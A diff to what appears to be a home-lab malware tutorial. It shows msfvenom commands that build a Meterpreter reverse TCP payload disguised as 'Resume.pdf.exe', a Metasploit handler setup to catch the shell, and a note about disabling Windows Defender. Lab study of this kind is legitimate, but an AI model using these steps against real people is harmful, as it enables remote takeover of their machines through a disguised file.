@@ -117,11 +117,24 @@ Before deploying the malware, disable Windows Defender to establish reverse TCP 
 - Here we are using *windows/x64/meterpreter_reverese_tcp*
 - In the terminal, enter
   
-     *msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.20.11 lport-4444 -f exe -o Resume.pdf.exe*
- 
+           msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.20.11 lport-4444 -f exe -o Resume.pdf.exe
+ Here we are specifying Meterpreter to connect back to the host through reverse TCP by mentioning the host IP and Port, and specifying the file format, i.e., exe and file output Resume.pdf.exe
 
-  
+ - Now the Resume.pdf.exe file is created.
 
+To listen to the port we have configured, in our malware, we need a handler, so open *Metasploit*.
+- terminal -> msfconsole
+- msf -> use exploit/multi/handler
+- Change the payload from a generic to a configured payload.
+- enter *set payload windows/x64/meterpreter/reverse_tcp*
+- Type options to see the changed payload
+
+Now, change the lhost to Kali
+- Enter *set lhost 192.168.20.11*
+- 
+Now we can start the handler
+- Enter *exploit*
+and listen in, and wait for the test machine to download and execute our malware. 
 
 
 
